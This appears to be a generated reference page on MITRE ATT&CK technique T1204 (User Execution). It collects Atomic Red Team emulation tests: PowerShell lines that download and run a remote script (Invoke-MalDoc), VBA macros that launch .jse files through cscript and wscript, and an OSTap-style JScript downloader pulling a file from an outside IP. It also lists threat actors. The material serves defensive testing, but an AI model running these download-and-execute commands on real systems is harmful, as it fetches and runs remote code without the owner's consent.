
# User Execution

## Description

### MITRE Description

> An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. 

As an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) 

While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Linux', 'Windows', 'macOS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1204

## Potential Commands

```
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
Invoke-MalDoc $macrocode "16.0" "#{ms_product}"

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\Public\art.jse`"`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"

echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js
cscript //E:Jscript %TEMP%\OSTapGet.js

echo var url = "https://128.30.52.100/TR/PNG/iso_8859-1.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
cscript //E:Jscript #{script_file}

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
Invoke-MalDoc $macrocode "16.0" "#{ms_product}"

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
Invoke-MalDoc $macrocode "16.0" "#{ms_product}"

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"

IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`", vbNormalFocus)`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"

```

## Commands Dataset

```
[{'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe '
             '#{jse_path}`"`n"\n'
             'Invoke-MalDoc $macrocode "16.0" "#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe '
             '#{jse_path}`"`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"C:\\Users\\Public\\art.jse`" For Output '
             'As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ '
             '`"cscript.exe C:\\Users\\Public\\art.jse`"`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" '
             '"#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'},
 {'command': 'echo var url = "#{file_url}", fso = '
             "WScript.CreateObject('Scripting.FileSystemObject'), request, "
             "stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); "
             "request.open('GET', url, false); request.send(); if "
             '(request.status === 200) {stream = '
             "WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type "
             '= 1; stream.Write(request.responseBody); stream.Position = 0; '
             'stream.SaveToFile(filename, 1); stream.Close();} else '
             '{WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js\n'
             'cscript //E:Jscript %TEMP%\\OSTapGet.js\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'},
 {'command': 'echo var url = "https://128.30.52.100/TR/PNG/iso_8859-1.txt", '
             "fso = WScript.CreateObject('Scripting.FileSystemObject'), "
             'request, stream; request = '
             "WScript.CreateObject('MSXML2.ServerXMLHTTP'); "
             "request.open('GET', url, false); request.send(); if "
             '(request.status === 200) {stream = '
             "WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type "
             '= 1; stream.Write(request.responseBody); stream.Position = 0; '
             'stream.SaveToFile(filename, 1); stream.Close();} else '
             '{WScript.Quit(1);}WScript.Quit(0); > #{script_file}\n'
             'cscript //E:Jscript #{script_file}\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T '
             '3`", vbNormalFocus)"\n'
             'Invoke-MalDoc $macrocode "16.0" "#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T '
             '3`", vbNormalFocus)"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c '
             'wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"\n'
             'Invoke-MalDoc $macrocode "16.0" "#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
             '#1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c '
             'wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'},
 {'command': 'IEX (iwr '
             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
             '$macrocode = "   Open `"C:\\Users\\Public\\art.jse`" For Output '
             'As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = '
             'Shell(`"cmd.exe /c wscript.exe //E:jscript '
             'C:\\Users\\Public\\art.jse`", vbNormalFocus)`n"\n'
             'Invoke-MalDoc $macrocode "#{ms_office_version}" '
             '"#{ms_product}"\n',
  'name': None,
  'source': 'atomics/T1204/T1204.yaml'}]
```

## Potential Detections

```json
[{'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Anti-virus']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Anti-virus']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - User Execution': {'atomic_tests': [{'auto_generated_guid': '8bebc690-18c7-4549-bc98-210f7019efff',
                                                              'dependencies': [{'description': 'Test '
                                                                                               'Requires '
                                                                                               'MS '
                                                                                               'Office '
                                                                                               'to '
                                                                                               'be '
                                                                                               'installed '
                                                                                               'and '
                                                                                               'have '
                                                                                               'been '
                                                                                               'run '
                                                                                               'previously. '
                                                                                               'Run '
                                                                                               '-GetPrereqs '
                                                                                               'to '
                                                                                               'run '
                                                                                               'msword '
                                                                                               'and '
                                                                                               'build '
                                                                                               'dependant '
                                                                                               'registry '
                                                                                               'keys\n',
                                                                                'get_prereq_command': '$msword '
                                                                                                      '= '
                                                                                                      'New-Object '
                                                                                                      '-ComObject '
                                                                                                      'word.application\n'
                                                                                                      'Stop-Process '
                                                                                                      '-Name '
                                                                                                      'WINWORD\n',
                                                                                'prereq_command': 'If '
                                                                                                  '(Test-Path '
                                                                                                  'HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) '
                                                                                                  '{ '
                                                                                                  'exit '
                                                                                                  '0 '
                                                                                                  '} '
                                                                                                  'else '
                                                                                                  '{ '
                                                                                                  'exit '
                                                                                                  '1 '
                                                                                                  '}\n'}],
                                                              'dependency_executor_name': 'powershell',
                                                              'description': 'This '
                                                                             'Test '
                                                                             'uses '
                                                                             'a '
                                                                             'VBA '
                                                                             'macro '
                                                                             'to '
                                                                             'create '
                                                                             'and '
                                                                             'execute '
                                                                             '#{jse_path} '
                                                                             'with '
                                                                             'cscript.exe. '
                                                                             'Upon '
                                                                             'execution, '
                                                                             'the '
                                                                             '.jse '
                                                                             'file '
                                                                             'launches '
                                                                             'wscript.exe.\n'
                                                                             'Execution '
                                                                             'is '
                                                                             'handled '
                                                                             'by '
                                                                             '[Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) '
                                                                             'to '
                                                                             'load '
                                                                             'and '
                                                                             'execute '
                                                                             'VBA '
                                                                             'code '
                                                                             'into '
                                                                             'Excel '
                                                                             'or '
                                                                             'Word '
                                                                             'documents.\n'
                                                                             '\n'
                                                                             'This '
                                                                             'is '
                                                                             'a '
                                                                             'known '
                                                                             'execution '
                                                                             'chain '
                                                                             'observed '
                                                                             'by '
                                                                             'the '
                                                                             'OSTap '
                                                                             'downloader '
                                                                             'commonly '
                                                                             'used '
                                                                             'in '
                                                                             'TrickBot '
                                                                             'campaigns\n'
                                                                             'References:\n'
                                                                             '  '
                                                                             'https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n',
                                                              'executor': {'cleanup_command': 'if '
                                                                                              '(Test-Path '
                                                                                              '#{jse_path}) '
                                                                                              '{ '
                                                                                              'Remove-Item '
                                                                                              '#{jse_path} '
                                                                                              '}\n'
                                                                                              'Remove-ItemProperty '
                                                                                              '-Path '
                                                                                              "'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' "
                                                                                              '-Name '
                                                                                              "'AccessVBOM' "
                                                                                              '-ErrorAction '
                                                                                              'Ignore\n',
                                                                           'command': 'IEX '
                                                                                      '(iwr '
                                                                                      '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
                                                                                      '$macrocode '
                                                                                      '= '
                                                                                      '"   '
                                                                                      'Open '
                                                                                      '`"#{jse_path}`" '
                                                                                      'For '
                                                                                      'Output '
                                                                                      'As '
                                                                                      '#1`n   '
                                                                                      'Write '
                                                                                      '#1, '
                                                                                      '`"WScript.Quit`"`n   '
                                                                                      'Close '
                                                                                      '#1`n   '
                                                                                      'Shell`$ '
                                                                                      '`"cscript.exe '
                                                                                      '#{jse_path}`"`n"\n'
                                                                                      'Invoke-MalDoc '
                                                                                      '$macrocode '
                                                                                      '"#{ms_office_version}" '
                                                                                      '"#{ms_product}"\n',
                                                                           'elevation_required': False,
                                                                           'name': 'powershell'},
                                                              'input_arguments': {'jse_path': {'default': 'C:\\Users\\Public\\art.jse',
                                                                                               'description': 'Path '
                                                                                                              'for '
                                                                                                              'the '
                                                                                                              'macro '
                                                                                                              'to '
                                                                                                              'write '
                                                                                                              'out '
                                                                                                              'the '
                                                                                                              '"malicious" '
                                                                                                              '.jse '
                                                                                                              'file\n',
                                                                                               'type': 'String'},
                                                                                  'ms_office_version': {'default': '16.0',
                                                                                                        'description': 'Microsoft '
                                                                                                                       'Office '
                                                                                                                       'version '
                                                                                                                       'number '
                                                                                                                       'found '
                                                                                                                       'in '
                                                                                                                       '"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office"',
                                                                                                        'type': 'String'},
                                                                                  'ms_product': {'default': 'Word',
                                                                                                 'description': 'Maldoc '
                                                                                                                'application '
                                                                                                                'Word '
                                                                                                                'or '
                                                                                                                'Excel',
                                                                                                 'type': 'String'}},
                                                              'name': 'OSTap '
                                                                      'Style '
                                                                      'Macro '
                                                                      'Execution',
                                                              'supported_platforms': ['windows']},
                                                             {'auto_generated_guid': '3f3af983-118a-4fa1-85d3-ba4daa739d80',
                                                              'description': 'Uses '
                                                                             'cscript '
                                                                             '//E:jscript '
                                                                             'to '
                                                                             'download '
                                                                             'a '
                                                                             'file\n',
                                                              'executor': {'cleanup_command': 'del '
                                                                                              '#{script_file} '
                                                                                              '/F '
                                                                                              '/Q '
                                                                                              '>nul '
                                                                                              '2>&1\n',
                                                                           'command': 'echo '
                                                                                      'var '
                                                                                      'url '
                                                                                      '= '
                                                                                      '"#{file_url}", '
                                                                                      'fso '
                                                                                      '= '
                                                                                      "WScript.CreateObject('Scripting.FileSystemObject'), "
                                                                                      'request, '
                                                                                      'stream; '
                                                                                      'request '
                                                                                      '= '
                                                                                      "WScript.CreateObject('MSXML2.ServerXMLHTTP'); "
                                                                                      "request.open('GET', "
                                                                                      'url, '
                                                                                      'false); '
                                                                                      'request.send(); '
                                                                                      'if '
                                                                                      '(request.status '
                                                                                      '=== '
                                                                                      '200) '
                                                                                      '{stream '
                                                                                      '= '
                                                                                      "WScript.CreateObject('ADODB.Stream'); "
                                                                                      'stream.Open(); '
                                                                                      'stream.Type '
                                                                                      '= '
                                                                                      '1; '
                                                                                      'stream.Write(request.responseBody); '
                                                                                      'stream.Position '
                                                                                      '= '
                                                                                      '0; '
                                                                                      'stream.SaveToFile(filename, '
                                                                                      '1); '
                                                                                      'stream.Close();} '
                                                                                      'else '
                                                                                      '{WScript.Quit(1);}WScript.Quit(0); '
                                                                                      '> '
                                                                                      '#{script_file}\n'
                                                                                      'cscript '
                                                                                      '//E:Jscript '
                                                                                      '#{script_file}\n',
                                                                           'elevation_required': False,
                                                                           'name': 'command_prompt'},
                                                              'input_arguments': {'file_url': {'default': 'https://128.30.52.100/TR/PNG/iso_8859-1.txt',
                                                                                               'description': 'URL '
                                                                                                              'to '
                                                                                                              'retrieve '
                                                                                                              'file '
                                                                                                              'from',
                                                                                               'type': 'Url'},
                                                                                  'script_file': {'default': '%TEMP%\\OSTapGet.js',
                                                                                                  'description': 'File '
                                                                                                                 'to '
                                                                                                                 'execute '
                                                                                                                 'jscript '
                                                                                                                 'code '
                                                                                                                 'from',
                                                                                                  'type': 'Path'}},
                                                              'name': 'OSTap '
                                                                      'Payload '
                                                                      'Download',
                                                              'supported_platforms': ['windows']},
                                                             {'auto_generated_guid': '0330a5d2-a45a-4272-a9ee-e364411c4b18',
                                                              'dependencies': [{'description': 'Test '
                                                                                               'Requires '
                                                                                               'MS '
                                                                                               'Office '
                                                                                               'to '
                                                                                               'be '
                                                                                               'installed '
                                                                                               'and '
                                                                                               'have '
                                                                                               'been '
                                                                                               'run '
                                                                                               'previously. '
                                                                                               'Run '
                                                                                               '-GetPrereqs '
                                                                                               'to '
                                                                                               'run '
                                                                                               'msword '
                                                                                               'and '
                                                                                               'build '
                                                                                               'dependant '
                                                                                               'registry '
                                                                                               'keys\n',
                                                                                'get_prereq_command': '$msword '
                                                                                                      '= '
                                                                                                      'New-Object '
                                                                                                      '-ComObject '
                                                                                                      'word.application\n'
                                                                                                      'Stop-Process '
                                                                                                      '-Name '
                                                                                                      'WINWORD\n',
                                                                                'prereq_command': 'If '
                                                                                                  '(Test-Path '
                                                                                                  'HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) '
                                                                                                  '{ '
                                                                                                  'exit '
                                                                                                  '0 '
                                                                                                  '} '
                                                                                                  'else '
                                                                                                  '{ '
                                                                                                  'exit '
                                                                                                  '1 '
                                                                                                  '}\n'}],
                                                              'dependency_executor_name': 'powershell',
                                                              'description': 'This '
                                                                             'Test '
                                                                             'uses '
                                                                             'a '
                                                                             'VBA '
                                                                             'macro '
                                                                             'to '
                                                                             'execute '
                                                                             'cmd '
                                                                             'with '
                                                                             'flags '
                                                                             'observed '
                                                                             'in '
                                                                             'recent '
                                                                             'maldoc '
                                                                             'and '
                                                                             '2nd '
                                                                             'stage '
                                                                             'downloaders. '
                                                                             'Upon '
                                                                             'execution, '
                                                                             'CMD '
                                                                             'will '
                                                                             'be '
                                                                             'launched.\n'
                                                                             'Execution '
                                                                             'is '
                                                                             'handled '
                                                                             'by '
                                                                             '[Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) '
                                                                             'to '
                                                                             'load '
                                                                             'and '
                                                                             'execute '
                                                                             'VBA '
                                                                             'code '
                                                                             'into '
                                                                             'Excel '
                                                                             'or '
                                                                             'Word '
                                                                             'documents.\n',
                                                              'executor': {'cleanup_command': 'Remove-ItemProperty '
                                                                                              '-Path '
                                                                                              "'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' "
                                                                                              '-Name '
                                                                                              "'AccessVBOM' "
                                                                                              '-ErrorAction '
                                                                                              'Ignore\n',
                                                                           'command': 'IEX '
                                                                                      '(iwr '
                                                                                      '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
                                                                                      '$macrocode '
                                                                                      '= '
                                                                                      '"  '
                                                                                      'a '
                                                                                      '= '
                                                                                      'Shell(`"cmd.exe '
                                                                                      '/c '
                                                                                      'choice '
                                                                                      '/C '
                                                                                      'Y '
                                                                                      '/N '
                                                                                      '/D '
                                                                                      'Y '
                                                                                      '/T '
                                                                                      '3`", '
                                                                                      'vbNormalFocus)"\n'
                                                                                      'Invoke-MalDoc '
                                                                                      '$macrocode '
                                                                                      '"#{ms_office_version}" '
                                                                                      '"#{ms_product}"\n',
                                                                           'elevation_required': False,
                                                                           'name': 'powershell'},
                                                              'input_arguments': {'ms_office_version': {'default': '16.0',
                                                                                                        'description': 'Microsoft '
                                                                                                                       'Office '
                                                                                                                       'version '
                                                                                                                       'number '
                                                                                                                       'found '
                                                                                                                       'in '
                                                                                                                       '"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office"',
                                                                                                        'type': 'String'},
                                                                                  'ms_product': {'default': 'Word',
                                                                                                 'description': 'Maldoc '
                                                                                                                'application '
                                                                                                                'Word '
                                                                                                                'or '
                                                                                                                'Excel',
                                                                                                 'type': 'String'}},
                                                              'name': 'Maldoc '
                                                                      'choice '
                                                                      'flags '
                                                                      'command '
                                                                      'execution',
                                                              'supported_platforms': ['windows']},
                                                             {'auto_generated_guid': 'add560ef-20d6-4011-a937-2c340f930911',
                                                              'dependencies': [{'description': 'Test '
                                                                                               'Requires '
                                                                                               'MS '
                                                                                               'Office '
                                                                                               'to '
                                                                                               'be '
                                                                                               'installed '
                                                                                               'and '
                                                                                               'have '
                                                                                               'been '
                                                                                               'run '
                                                                                               'previously. '
                                                                                               'Run '
                                                                                               '-GetPrereqs '
                                                                                               'to '
                                                                                               'run '
                                                                                               'msword '
                                                                                               'and '
                                                                                               'build '
                                                                                               'dependant '
                                                                                               'registry '
                                                                                               'keys\n',
                                                                                'get_prereq_command': '$msword '
                                                                                                      '= '
                                                                                                      'New-Object '
                                                                                                      '-ComObject '
                                                                                                      'word.application\n'
                                                                                                      'Stop-Process '
                                                                                                      '-Name '
                                                                                                      'WINWORD\n',
                                                                                'prereq_command': 'If '
                                                                                                  '(Test-Path '
                                                                                                  'HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) '
                                                                                                  '{ '
                                                                                                  'exit '
                                                                                                  '0 '
                                                                                                  '} '
                                                                                                  'else '
                                                                                                  '{ '
                                                                                                  'exit '
                                                                                                  '1 '
                                                                                                  '}\n'}],
                                                              'dependency_executor_name': 'powershell',
                                                              'description': 'Malicious '
                                                                             'JavaScript '
                                                                             'executing '
                                                                             'CMD '
                                                                             'which '
                                                                             'spawns '
                                                                             'wscript.exe '
                                                                             '//e:jscript\n'
                                                                             '\n'
                                                                             'Execution '
                                                                             'is '
                                                                             'handled '
                                                                             'by '
                                                                             '[Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) '
                                                                             'to '
                                                                             'load '
                                                                             'and '
                                                                             'execute '
                                                                             'VBA '
                                                                             'code '
                                                                             'into '
                                                                             'Excel '
                                                                             'or '
                                                                             'Word '
                                                                             'documents.\n',
                                                              'executor': {'cleanup_command': 'if '
                                                                                              '(Test-Path '
                                                                                              '#{jse_path}) '
                                                                                              '{ '
                                                                                              'Remove-Item '
                                                                                              '#{jse_path} '
                                                                                              '}\n'
                                                                                              'Remove-ItemProperty '
                                                                                              '-Path '
                                                                                              "'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' "
                                                                                              '-Name '
                                                                                              "'AccessVBOM' "
                                                                                              '-ErrorAction '
                                                                                              'Ignore\n',
                                                                           'command': 'IEX '
                                                                                      '(iwr '
                                                                                      '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
                                                                                      '$macrocode '
                                                                                      '= '
                                                                                      '"   '
                                                                                      'Open '
                                                                                      '`"#{jse_path}`" '
                                                                                      'For '
                                                                                      'Output '
                                                                                      'As '
                                                                                      '#1`n   '
                                                                                      'Write '
                                                                                      '#1, '
                                                                                      '`"WScript.Quit`"`n   '
                                                                                      'Close '
                                                                                      '#1`n   '
                                                                                      'a '
                                                                                      '= '
                                                                                      'Shell(`"cmd.exe '
                                                                                      '/c '
                                                                                      'wscript.exe '
                                                                                      '//E:jscript '
                                                                                      '#{jse_path}`", '
                                                                                      'vbNormalFocus)`n"\n'
                                                                                      'Invoke-MalDoc '
                                                                                      '$macrocode '
                                                                                      '"#{ms_office_version}" '
                                                                                      '"#{ms_product}"\n',
                                                                           'elevation_required': False,
                                                                           'name': 'powershell'},
                                                              'input_arguments': {'jse_path': {'default': 'C:\\Users\\Public\\art.jse',
                                                                                               'description': 'jse '
                                                                                                              'file '
                                                                                                              'to '
                                                                                                              'execute '
                                                                                                              'with '
                                                                                                              'wscript',
                                                                                               'type': 'Path'},
                                                                                  'ms_office_version': {'default': '16.0',
                                                                                                        'description': 'Microsoft '
                                                                                                                       'Office '
                                                                                                                       'version '
                                                                                                                       'number '
                                                                                                                       'found '
                                                                                                                       'in '
                                                                                                                       '"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office"',
                                                                                                        'type': 'String'},
                                                                                  'ms_product': {'default': 'Word',
                                                                                                 'description': 'Maldoc '
                                                                                                                'application '
                                                                                                                'Word '
                                                                                                                'or '
                                                                                                                'Excel',
                                                                                                 'type': 'String'}},
                                                              'name': 'OSTAP '
                                                                      'JS '
                                                                      'version',
                                                              'supported_platforms': ['windows']}],
                                            'attack_technique': 'T1204',
                                            'display_name': 'User Execution'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations

None

# Actors


* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)

* [APT19](../actors/APT19.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [APT33](../actors/APT33.md)
    
* [APT37](../actors/APT37.md)
    
* [Dark Caracal](../actors/Dark-Caracal.md)
    
* [APT28](../actors/APT28.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [APT29](../actors/APT29.md)
    
* [FIN8](../actors/FIN8.md)
    
* [menuPass](../actors/menuPass.md)
    
* [FIN7](../actors/FIN7.md)
    
* [FIN4](../actors/FIN4.md)
    
* [DarkHydrus](../actors/DarkHydrus.md)
    
* [Turla](../actors/Turla.md)
    
* [Darkhotel](../actors/Darkhotel.md)
    
* [Elderwood](../actors/Elderwood.md)
    
* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [TA459](../actors/TA459.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Gallmaker](../actors/Gallmaker.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [APT32](../actors/APT32.md)
    
* [Rancor](../actors/Rancor.md)
    
* [PLATINUM](../actors/PLATINUM.md)
    
* [Night Dragon](../actors/Night-Dragon.md)
    
* [APT39](../actors/APT39.md)
    
* [The White Company](../actors/The-White-Company.md)
    
* [Silence](../actors/Silence.md)
    
* [TA505](../actors/TA505.md)
    
* [APT12](../actors/APT12.md)
    
* [admin@338](../actors/admin@338.md)
    
* [Machete](../actors/Machete.md)
    
